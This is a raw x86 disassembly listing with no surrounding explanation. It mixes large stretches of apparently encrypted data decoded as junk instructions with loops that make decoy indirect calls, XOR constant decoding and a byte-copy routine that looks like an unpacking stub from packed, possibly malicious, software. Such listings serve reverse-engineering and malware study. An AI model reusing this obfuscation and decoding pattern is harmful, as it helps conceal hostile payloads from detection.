  40f27e:	push   ebx
  40f27f:	aad    0x3c
  40f281:	or     eax,0x5342bde8
  40f286:	idiv   DWORD PTR [ecx]
  40f288:	ds xor ebx,eax
  40f28b:	and    edx,ebx
  40f28d:	inc    edx
  40f28e:	das    
  40f28f:	xchg   esp,eax
  40f290:	(bad)  
  40f292:	adc    eax,DWORD PTR [ecx-0x39]
  40f295:	fistp  DWORD PTR [edi]
  40f297:	cld    
  40f298:	jo     0x40f235
  40f29a:	jge    0x40f255
  40f29c:	mov    ecx,0x4558ac55
  40f2a1:	lahf   
  40f2a2:	jl     0x40f2fb
  40f2a4:	mov    ds:0x7995352d,eax
  40f2a9:	pop    ss
  40f2aa:	mov    ah,0x10
  40f2ac:	repnz xor cl,BYTE PTR [ecx]
  40f2af:	ins    BYTE PTR es:[edi],dx
  40f2b0:	loopne 0x40f2d1
  40f2b2:	sbb    eax,0x7ce45e0c
  40f2b7:	jo     0x40f282
  40f2b9:	and    DWORD PTR [ebp+0x5],ebp
  40f2bc:	sbb    eax,0x36148357
  40f2c1:	push   0x8bea4644
  40f2c6:	or     ebx,0x79
  40f2c9:	xlat   BYTE PTR ds:[ebx]
  40f2ca:	pop    edi
  40f2cb:	retf   0xf414
  40f2ce:	mov    ah,al
  40f2d0:	(bad)  
  40f2d2:	popa   
  40f2d3:	(bad)  
  40f2d4:	clc    
  40f2d5:	mov    al,ds:0xeeb66208
  40f2da:	in     eax,0x4b
  40f2dc:	int    0x15
  40f2de:	inc    esi
  40f2df:	jecxz  0x40f2d4
  40f2e1:	mov    ecx,0x18ce64bf
  40f2e6:	sar    DWORD PTR [ebp+0x6b],1
  40f2e9:	(bad)  
  40f2ea:	dec    esi
  40f2eb:	shl    edx,cl
  40f2ed:	iret   
  40f2ee:	xor    DWORD PTR [ecx-0x5d],0x2ca8ebac
  40f2f5:	(bad)  
  40f2f6:	scas   al,BYTE PTR es:[edi]
  40f2f7:	(bad)  
  40f2f9:	fwait
  40f2fa:	addr16 adc al,0x90
  40f2fd:	ficomp WORD PTR [esi-0x80]
  40f300:	popa   
  40f301:	sti    
  40f302:	mov    ebx,ebx
  40f304:	push   ds
  40f305:	push   ebp
  40f306:	jns    0x40f2a2
  40f308:	dec    edx
  40f309:	cli    
  40f30a:	fistp  DWORD PTR [ebx+0x796c6c99]
  40f310:	push   ds
  40f311:	es cmp cl,al
  40f314:	mov    esi,0x50aea9b9
  40f319:	cld    
  40f31a:	adc    DWORD PTR [edx],esp
  40f31c:	out    0xe7,al
  40f31e:	std    
  40f31f:	aaa    
  40f320:	in     eax,0x44
  40f322:	loop   0x40f394
  40f324:	xor    edi,ebp
  40f326:	sub    edi,DWORD PTR [ebp+0x69]
  40f329:	push   edi
  40f32a:	and    BYTE PTR [edx+eiz*1],bh
  40f32d:	jmp    0x40f355
  40f32f:	xor    DWORD PTR [ecx-0x72],edi
  40f332:	and    edx,edi
  40f334:	lds    ebp,FWORD PTR [edx+0x1e6a3333]
  40f33a:	pop    ds
  40f33b:	pop    ebp
  40f33c:	inc    ecx
  40f33d:	sysexit 
  40f33f:	sbb    al,0xf0
  40f341:	repz (bad) 
  40f343:	lods   eax,DWORD PTR ds:[esi]
  40f344:	hlt    
  40f345:	into   
  40f346:	mov    ebx,ebp
  40f348:	mov    dh,0xb0
  40f34a:	xchg   edx,eax
  40f34b:	pushf  
  40f34c:	adc    eax,0x6fb83193
  40f351:	jnp    0x40f2ef
  40f353:	lods   eax,DWORD PTR ds:[esi]
  40f354:	sbb    BYTE PTR [edx],bl
  40f356:	mov    BYTE PTR ds:0x8355efba,ch
  40f35c:	js     0x40f30b
  40f35e:	jbe    0x40f300
  40f360:	loope  0x40f317
  40f362:	ins    BYTE PTR es:[edi],dx
  40f363:	loop   0x40f2f7
  40f365:	adc    BYTE PTR [eax],dh
  40f367:	loope  0x40f30a
  40f369:	and    eax,0xed309535
  40f36e:	bound  ebx,QWORD PTR [eax]
  40f370:	ins    DWORD PTR es:[edi],dx
  40f371:	jmp    0x22d0:0x7f2e79ea
  40f378:	sar    BYTE PTR [esi-0x54],1
  40f37b:	(bad)  
  40f37c:	lock iret 
  40f37e:	test   BYTE PTR [esi],dh
  40f380:	stos   DWORD PTR es:[edi],eax
  40f381:	nop
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x433827,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x642822c7]
  40f540:	retf   
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f54a:	bound  esi,QWORD PTR [ebx]
  40f54c:	cmp    ch,BYTE PTR [eax-0x28]
  40f54f:	in     al,0x21
  40f551:	pop    ecx
  40f552:	idiv   DWORD PTR [ebx+ecx*1-0x5]
  40f556:	mov    ecx,0xa75f5bf4
  40f55b:	mov    al,0x3b
  40f55d:	xchg   BYTE PTR [edx+ebp*8],al
  40f560:	dec    esi
  40f561:	push   ecx
  40f562:	aam    0x60
  40f564:	push   edi
  40f565:	mov    eax,ds:0x5a0ae518
  40f56a:	mov    edi,0x7b012b8f
  40f56f:	fsubr  DWORD PTR [ebp-0x71]
  40f572:	sbb    eax,0x26be267c
  40f577:	sbb    eax,DWORD PTR fs:[ecx]
  40f57a:	call   0x2c835f4
  40f57f:	pop    edi
  40f580:	xor    edx,DWORD PTR [edx-0x73c44a73]
  40f586:	lahf   
  40f587:	lods   al,BYTE PTR ds:[esi]
  40f588:	popf   
  40f589:	rol    DWORD PTR [esi-0x32],0x21
  40f58d:	pop    es
  40f58e:	sar    DWORD PTR gs:[esi-0x2cfa40a6],1
  40f595:	cdq    
  40f596:	retf   
  40f597:	cmp    BYTE PTR [edx],cl
  40f599:	scas   al,BYTE PTR es:[edi]
  40f59a:	add    DWORD PTR [esi+0x2218ada0],esi
  40f5a0:	add    eax,0x70d52b28
  40f5a5:	jae    0x40f5d8
  40f5a7:	cmc    
  40f5a8:	aad    0x84
  40f5aa:	aam    0x45
  40f5ac:	add    DWORD PTR [ebp+0x3b131284],edi
  40f5b2:	xchg   ecx,eax
  40f5b3:	inc    ebp
  40f5b4:	dec    eax
  40f5b5:	fwait
  40f5b6:	mov    esi,0x7cdc0374
  40f5bb:	jbe    0x40f540
  40f5bd:	jmp    0x2f9a:0xd1d9a8ff
  40f5c4:	mov    esp,ss
  40f5c6:	adc    esi,DWORD PTR [edi]
  40f5c8:	mov    eax,ds:0x75517d08
  40f5cd:	jo     0x40f5b6
  40f5cf:	sub    esi,edi
  40f5d1:	js     0x40f5f4
  40f5d3:	daa    
  40f5d4:	xchg   ebp,eax
  40f5d5:	pusha  
  40f5d6:	add    DWORD PTR [edi+0x18],ebp
  40f5d9:	jno    0x40f592
  40f5db:	popa   
  40f5dc:	pusha  
  40f5dd:	aam    0x6a
  40f5df:	shl    esp,1
  40f5e1:	arpl   WORD PTR [ebp-0x67],di
  40f5e4:	data16 jle 0x40f58f
  40f5e7:	cmp    dl,BYTE PTR [ebx+edx*2-0x2cc8abd4]
  40f5ee:	fild   DWORD PTR [ecx+0x38]
  40f5f1:	gs retf 
  40f5f3:	scas   al,BYTE PTR es:[edi]
  40f5f4:	mov    dl,0xa1
  40f5f6:	jle    0x40f593
  40f5f8:	ficomp WORD PTR [esi+0x60]
  40f5fb:	xchg   edi,eax
  40f5fc:	and    esi,DWORD PTR [edi+0x82c12e]
  40f602:	rcr    al,0x65
  40f605:	pop    edi
  40f606:	inc    eax
  40f607:	cmp    eax,0xe72ab54b
  40f60c:	fyl2xp1 
  40f60e:	std    
  40f60f:	retf   
  40f610:	popa   
  40f611:	fstp   DWORD PTR [esi-0x4f]
  40f614:	adc    eax,0xf54ebfce
  40f619:	mov    ch,0xed
  40f61b:	mov    ds:0x81c5901,al
  40f620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f621:	push   edi
  40f622:	dec    edx
  40f623:	xchg   DWORD PTR [ecx+0x4d],edi
  40f626:	mov    bl,0x77
  40f628:	retf   
  40f629:	fs inc ebp
  40f62b:	ins    DWORD PTR es:[edi],dx
  40f62c:	jb     0x40f5b6
  40f62e:	mov    edi,edi
  40f630:	xor    dh,cl
  40f632:	push   0x6e
  40f634:	dec    ebp
  40f635:	fmul   st(6),st
  40f637:	sub    esp,DWORD PTR [esi+edx*4]
  40f63a:	pop    esi
  40f63b:	scas   al,BYTE PTR es:[edi]
  40f63c:	cmp    eax,0x799bde62
  40f641:	mov    ch,0xaa
  40f643:	test   BYTE PTR [ebp-0x5e67d92b],dl
  40f649:	sub    bh,0x48
  40f64c:	push   ebp
  40f64d:	int3   
  40f64e:	iret   
  40f64f:	mov    dl,0xda
  40f651:	inc    ebx
  40f652:	xchg   ebx,eax
  40f653:	ins    WORD PTR es:[edi],dx
  40f655:	aas    
  40f656:	pop    edi
  40f657:	js     0x40f6c3
  40f659:	rcl    BYTE PTR [eax],1
  40f65b:	push   0x6a
  40f65d:	xchg   esi,eax
  40f65e:	sub    bh,dl
  40f660:	xor    ecx,DWORD PTR [esi+0xe18fdef]
  40f666:	mov    DWORD PTR [edi+edi*8-0x6a],edi
  40f66a:	push   eax
  40f66b:	data16 test al,0x5
  40f66e:	xchg   esi,eax
  40f66f:	adc    DWORD PTR [ebp+0x27],0xffffffdc
  40f673:	adc    BYTE PTR [ecx+0x4c22a19c],bl
  40f679:	stos   WORD PTR es:[edi],ax
  40f67b:	add    eax,0xf2b935d8
  40f680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f682:	or     ch,cl
  40f684:	rcr    BYTE PTR [ebp-0x21a6e276],cl
  40f68a:	nop
  40f68b:	in     al,0xdf
  40f68d:	lds    esp,FWORD PTR [esi-0xe]
  40f690:	xchg   edx,eax
  40f691:	jp     0x40f6bd
  40f693:	dec    ebp
  40f694:	rcr    BYTE PTR [ebx+edi*8-0x49],0x7b
  40f699:	xor    ah,BYTE PTR [edi-0x565b943d]
  40f69f:	jnp    0x40f683
  40f6a1:	push   0x2e
  40f6a3:	cli    
  40f6a4:	test   al,0x1c
  40f6a6:	ins    DWORD PTR es:[edi],dx
  40f6a7:	push   edx
  40f6a8:	outs   dx,BYTE PTR ds:[esi]
  40f6a9:	jmp    0xf588:0xa44e6678
  40f6b0:	shl    BYTE PTR [esi],cl
  40f6b2:	mov    cs,ebx
  40f6b4:	std    
  40f6b5:	xor    BYTE PTR [si],al
  40f6b8:	int3   
  40f6b9:	cs or  al,0xd8
  40f6bc:	je     0x40f656
  40f6be:	stos   BYTE PTR es:[edi],al
  40f6bf:	jb     0x40f73c
  40f6c1:	jns    0x40f72a
  40f6c3:	out    0xe9,eax
  40f6c5:	sbb    DWORD PTR [eax-0x2c],esp
  40f6c8:	mov    ah,ah
  40f6ca:	push   ds
  40f6cb:	(bad)  
  40f6cd:	xchg   ecx,eax
  40f6ce:	mov    ah,0x5f
  40f6d0:	add    eax,0xe103ea6
  40f6d5:	inc    esi
  40f6d6:	sub    eax,0xbf3a18d8
  40f6db:	sbb    ah,bl
  40f6dd:	je     0x40f74a
  40f6df:	cli    
  40f6e0:	or     ebx,ebp
  40f6e2:	mov    ah,0x25
  40f6e4:	fisub  DWORD PTR [edx]
  40f6e6:	shl    DWORD PTR [ecx+0x372ac593],cl
  40f6ec:	loopne 0x40f698
  40f6ee:	fisttp QWORD PTR [ecx+0x46]
  40f6f1:	test   eax,0x82a1055e
  40f6f6:	mov    ebp,0x45630209
  40f6fb:	stos   BYTE PTR es:[edi],al
  40f6fc:	(bad)  
  40f6fd:	xchg   edx,eax
  40f6fe:	jne    0x40f688
  40f700:	pusha  
  40f701:	pop    ss
  40f702:	push   ss
  40f703:	add    bh,bh
  40f705:	lock or BYTE PTR [ecx-0x5b],cl
  40f709:	mov    ecx,0x73189522
  40f70e:	pop    es
  40f70f:	xor    dh,bl
  40f711:	sbb    ah,0xa
  40f714:	mov    ecx,0x270bb8e2
  40f719:	xchg   ebx,eax
  40f71a:	je     0x40f78d
  40f71c:	mov    ch,0x6d
  40f71e:	leave  
  40f71f:	sub    eax,0x2e2d8e21
  40f724:	std    
  40f725:	lds    ebp,FWORD PTR [edx+0x7d]
  40f728:	push   esp
  40f729:	or     BYTE PTR [eax+0x79789489],0xe7
  40f730:	xchg   esp,eax
  40f731:	mov    WORD PTR [esi-0x2f],cs
  40f734:	inc    eax
  40f735:	mov    al,0x78
  40f737:	outs   dx,BYTE PTR ds:[esi]
  40f738:	aaa    
  40f739:	adc    al,0xe8
  40f73b:	xlat   BYTE PTR ds:[ebx]
  40f73c:	test   BYTE PTR [eax-0x76],bl
  40f73f:	scas   eax,DWORD PTR es:[edi]
  40f740:	into   
  40f741:	dec    ecx
  40f742:	leave  
  40f743:	inc    eax
  40f744:	mov    bh,0x87
  40f746:	test   eax,0x47964b2
  40f74b:	bswap  ebx
  40f74d:	pushf  
  40f74e:	mov    bl,0xa6
  40f750:	xor    DWORD PTR [ebx-0x64],edi
  40f753:	mov    esp,0x9b519713
  40f758:	jo     0x40f74a
  40f75a:	mov    esp,0xa7624223
  40f760:	stos   BYTE PTR es:[edi],al
  40f761:	pop    es
  40f762:	xchg   edi,eax
  40f763:	ds pop ss
  40f765:	fadd   QWORD PTR [ebx+0x0]
  40f768:	ret    
  40f769:	ret    0x11bf
  40f76c:	test   edx,ecx
  40f76e:	cmp    al,0x8f
  40f770:	fwait
  40f771:	arpl   WORD PTR [esi+eiz*1],si
  40f774:	dec    ebp
  40f775:	mov    WORD PTR [esi-0x24c12be5],cs
  40f77b:	cld    
  40f77c:	jne    0x40f74b
  40f77e:	ret    
  40f77f:	xchg   DWORD PTR [esi-0xb8f8a56],esi
  40f785:	push   ds
  40f786:	adc    eax,0x482170d8
  40f78b:	sbb    esp,edi
  40f78d:	add    ch,dl
  40f78f:	cmp    edx,DWORD PTR [edi+0x3d]
  40f792:	mov    dl,0x30
  40f794:	aaa    
  40f795:	push   ss
  40f796:	leave  
  40f797:	aam    0xe5
  40f799:	and    BYTE PTR [edx-0x15915f3],ah
  40f79f:	scas   eax,DWORD PTR es:[edi]
  40f7a0:	mov    DWORD PTR [ecx+0x6a],esp
  40f7a3:	add    eax,0x6fbf1188
  40f7a8:	rol    DWORD PTR [edi],1
  40f7aa:	retf   0xc02d
  40f7ad:	add    edx,DWORD PTR [edi+0x91a520b]
  40f7b3:	xchg   esp,eax
  40f7b4:	jns    0x40f7a6
  40f7b6:	and    DWORD PTR [ecx],edi
  40f7b8:	loopne 0x40f7d5
  40f7ba:	mov    ds:0x70f65797,eax
  40f7bf:	(bad)
  40f7c2:	cmp    al,ah
  40f7c4:	or     ebx,DWORD PTR [edi]
  40f7c6:	mov    WORD PTR [esi-0x6c074800],ss
  40f7cc:	jne    0x40f7ee
  40f7ce:	push   esp
  40f7cf:	mov    ebx,0x829330e6
  40f7d4:	sbb    BYTE PTR [ecx+0x2aaad8e3],bh
  40f7da:	and    edi,DWORD PTR [ebx+0x50d94107]
  40f7e0:	lds    edi,FWORD PTR [edx+0x1a]
  40f7e3:	repz enter 0x7a0c,0x5a
  40f7e8:	mov    edi,0x42f6169f
  40f7ed:	(bad)  
  40f7ee:	in     eax,dx
  40f7ef:	das    
  40f7f0:	es mov edx,0x415ae8c6
  40f7f6:	das    
  40f7f7:	imul   esp,DWORD PTR [esi*1+0x1870aa0b],0xbe16e5c3
  40f802:	mov    dl,0x24
  40f804:	mov    cl,ah
  40f806:	xor    al,0x3a
  40f808:	ss cmp eax,0x6e270b4c
  40f80e:	clc    
  40f80f:	jp     0x40f84c
  40f811:	enter  0x987,0xa5
  40f815:	fdivr  QWORD PTR es:[eax+0x34c2067f]
  40f81c:	call   0x36a963ab
  40f821:	loopne 0x40f870
  40f823:	pop    eax
  40f824:	pop    ebx
  40f825:	add    eax,0x49f05d05
  40f82a:	add    eax,0x22c0c94a
  40f82f:	icebp  
  40f830:	fdivr  st,st(4)
  40f832:	and    eax,0xee07a280
  40f837:	adc    ch,0x48
  40f83a:	push   eax
  40f83b:	xchg   ebp,eax
  40f83c:	push   edi
  40f83d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f83e:	aam    0x1f
  40f840:	push   ss
  40f841:	lods   al,BYTE PTR ds:[esi]
  40f842:	xchg   ecx,eax
  40f843:	pop    edx
  40f844:	push   ebx
  40f845:	dec    eax
  40f846:	aas    
  40f847:	mov    edx,0x331088ce
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xf72d5a3f
  40f897:	pop    esp
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	pusha  
  40f8a1:	or     eax,0x855309a9
  40f8a6:	jg     0x40f882
  40f8a8:	jp     0x40f88f
  40f8aa:	jmp    0x5bf71e51
  40f8af:	or     al,0xb4
  40f8b1:	(bad)  
  40f8b2:	jo     0x40f8ad
  40f8b4:	mov    eax,ds:0xdbbb9bb1
  40f8b9:	pop    ebp
  40f8ba:	retf   
  40f8bb:	dec    ebx
  40f8bc:	cmc    
  40f8bd:	call   0x114be70c
  40f8c2:	xor    al,0x5
  40f8c4:	lahf   
  40f8c5:	js     0x40f90f
  40f8c7:	nop
  40f8c8:	pop    eax
  40f8c9:	cmp    BYTE PTR [eax-0x65],ch
  40f8cc:	push   ds
  40f8cd:	sbb    DWORD PTR [ecx-0xfe38142],ebx
  40f8d3:	and    edx,edi
  40f8d5:	loop   0x40f8d8
  40f8d7:	xchg   ebp,eax
  40f8d8:	adc    eax,0xeb32e25c
  40f8dd:	mov    DWORD PTR [esi+0x24],0xd65c7c4b
  40f8e4:	push   0xffffffee
  40f8e6:	jae    0x40f94c
  40f8e8:	cmp    BYTE PTR [edx],al
  40f8ea:	and    BYTE PTR [ebx],bl
  40f8ec:	retf   
  40f8ed:	daa    
  40f8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ef:	dec    esp
  40f8f0:	std    
  40f8f1:	mov    bl,0x33
  40f8f3:	pop    es
  40f8f4:	pop    ebx
  40f8f5:	push   es
  40f8f6:	xchg   ebx,eax
  40f8f7:	mov    eax,ds:0xf575e7b5
  40f8fc:	mov    dl,0xc2
  40f8fe:	inc    esi
  40f8ff:	jg     0x40f968
  40f901:	fcmovbe st,st(5)
  40f903:	ret    0x3ae8
  40f906:	pop    eax
  40f907:	xchg   DWORD PTR [ebx],ecx
  40f909:	cmp    al,0x9
  40f90b:	jbe    0x40f973
  40f90d:	pushf  
  40f90e:	inc    ecx
  40f90f:	mov    ebp,0xfd7b9d22
  40f914:	lods   eax,DWORD PTR ds:[esi]
  40f915:	enter  0x13bf,0x43
  40f919:	xor    BYTE PTR [ebp+esi*1+0x6726f497],0x3b
  40f921:	add    BYTE PTR [eax],ch
  40f923:	pusha  
  40f924:	(bad)  
  40f925:	rol    dh,1
  40f927:	pop    edi
  40f928:	mov    al,ds:0xd10d7d8e
  40f92d:	lahf   
  40f92e:	cli    
  40f92f:	popf   
  40f930:	js     0x40f99c
  40f932:	push   ecx
  40f933:	mov    dl,0x7c
  40f935:	add    esp,ebp
  40f937:	(bad)  
  40f939:	cwde   
  40f93a:	xchg   esi,eax
  40f93b:	std    
  40f93c:	or     BYTE PTR [eax-0x78],al
  40f93f:	rol    edi,0xe
  40f942:	bound  eax,QWORD PTR [esi+ebx*8-0x2102eef7]
  40f949:	push   es
  40f94a:	cmp    ah,BYTE PTR [eax-0x32ec8919]
  40f950:	pop    edx
  40f951:	repz push si
  40f954:	push   esi
  40f955:	sbb    DWORD PTR [edx],esi
  40f957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f958:	mov    dh,0x31
  40f95a:	xchg   ebp,eax
  40f95b:	adc    DWORD PTR [eax],esi
  40f95d:	and    eax,0x6cf4d2e1
  40f962:	(bad)  
  40f963:	in     al,dx
  40f964:	icebp  
  40f965:	and    BYTE PTR [ebx+0x7e6afe54],0xe4
  40f96c:	scas   al,BYTE PTR es:[edi]
  40f96d:	adc    ebx,DWORD PTR [eax]
  40f96f:	or     al,0xb
  40f971:	or     DWORD PTR [edi],0xffffff81
  40f974:	lods   al,BYTE PTR ds:[esi]
  40f975:	sbb    al,0x2f
  40f977:	inc    eax
  40f978:	push   ebp
  40f979:	(bad)  
  40f97a:	cmp    al,0xb8
  40f97c:	out    0xd3,al
  40f97e:	and    dl,al
  40f980:	ret    0x14d6
  40f983:	fld    st(5)
  40f985:	cwde   
  40f986:	mov    al,ds:0x29a6ef65
  40f98b:	dec    ecx
  40f98c:	or     eax,0x3eb54000
  40f991:	xlat   BYTE PTR gs:[ebx]
  40f993:	pop    edi
  40f994:	mov    dl,0x7e
  40f996:	ds inc ebp
  40f998:	icebp  
  40f999:	lea    ebp,[ecx-0x4fa476e8]
  40f99f:	stos   DWORD PTR es:[edi],eax
  40f9a0:	add    edx,esp
  40f9a2:	pop    eax
  40f9a3:	inc    ebp
  40f9a4:	nop
  40f9a5:	cmp    ah,BYTE PTR [esi+edx*2-0x4]
  40f9a9:	add    eax,0x6828015c
  40f9ae:	sbb    al,0x82
  40f9b0:	retf   
  40f9b1:	mov    eax,0x40050cb6
  40f9b6:	mov    ds:0xdfdf8035,al
  40f9bb:	jle    0x40f9da
  40f9bd:	push   esp
  40f9be:	fdivr  st(6),st
  40f9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9c1:	je     0x40f9cf
  40f9c3:	jle    0x40f9db
  40f9c5:	inc    DWORD PTR [eax]
  40f9c7:	add    eax,0x1effd1e4
  40f9cc:	cwde   
  40f9cd:	jb     0x40fa06
  40f9cf:	mov    ebx,DWORD PTR [edx-0x3e]
  40f9d2:	mov    edi,0xb76d4ade
  40f9d7:	repz xor al,0x22
  40f9da:	lods   al,BYTE PTR ds:[esi]
  40f9db:	jb     0x40f9e8
  40f9dd:	dec    ebp
  40f9de:	out    dx,al
  40f9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e0:	dec    edx
  40f9e1:	add    ch,BYTE PTR [eax+0xc]
  40f9e4:	in     al,dx
  40f9e5:	sbb    edi,eax
  40f9e7:	inc    ebp
  40f9e8:	ins    BYTE PTR es:[edi],dx
  40f9e9:	push   cs
  40f9ea:	adc    al,0x2d
  40f9ec:	xchg   edx,eax
  40f9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ee:	shl    DWORD PTR [ebx+0x29],0x56
  40f9f2:	mov    al,BYTE PTR [esi+0x6dfcaf3c]
  40f9f8:	adc    edx,DWORD PTR [ebp-0x62]
  40f9fb:	adc    BYTE PTR [esi-0x6a],cl
  40f9fe:	pop    ebx
  40f9ff:	(bad)  
  40fa00:	jb     0x40fa49
  40fa02:	retf   
  40fa03:	daa    
  40fa04:	test   BYTE PTR es:[eax-0x19],dh
  40fa08:	ins    DWORD PTR es:[edi],dx
  40fa09:	pushf  
  40fa0a:	mov    cl,0x21
  40fa0c:	dec    ebx
  40fa0d:	jns    0x40f9ca
  40fa0f:	sbb    al,0x52
  40fa11:	or     dl,BYTE PTR [esp+edi*8+0x55]
  40fa15:	mov    eax,ds:0x31d766bd
  40fa1a:	cmp    BYTE PTR [eax-0x6d537a10],dl
  40fa20:	jl     0x40fa18
  40fa22:	add    ah,BYTE PTR [edi+0x16]
  40fa25:	pushf  
  40fa26:	arpl   WORD PTR [ebx+0x4b867d5c],cx
  40fa2c:	dec    esi
  40fa2d:	outs   dx,BYTE PTR ds:[esi]
  40fa2e:	sub    bp,dx
  40fa31:	out    dx,al
  40fa32:	clc    
  40fa33:	les    esp,FWORD PTR [esi]
  40fa35:	inc    edx
  40fa36:	mov    esi,0xbdf3b1e6
  40fa3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa3c:	pop    edi
  40fa3d:	data16 add al,0x76
  40fa40:	scas   eax,DWORD PTR es:[edi]
  40fa41:	sub    DWORD PTR es:[eax-0x232ecdb7],0xffffffcf
  40fa49:	and    BYTE PTR [edi-0x1e4595d9],ch
  40fa4f:	adc    DWORD PTR [ebx+0x3],ebx
  40fa52:	sub    dl,bh
  40fa54:	pop    ebx
  40fa55:	icebp  
  40fa56:	out    0x60,al
  40fa58:	(bad)  
  40fa59:	(bad)  [ebp-0x74]
  40fa5c:	mov    bl,0xfe
  40fa5e:	push   edx
  40fa5f:	out    dx,al
  40fa60:	push   0xfffffff2
  40fa62:	lods   eax,DWORD PTR ds:[esi]
  40fa63:	inc    esp
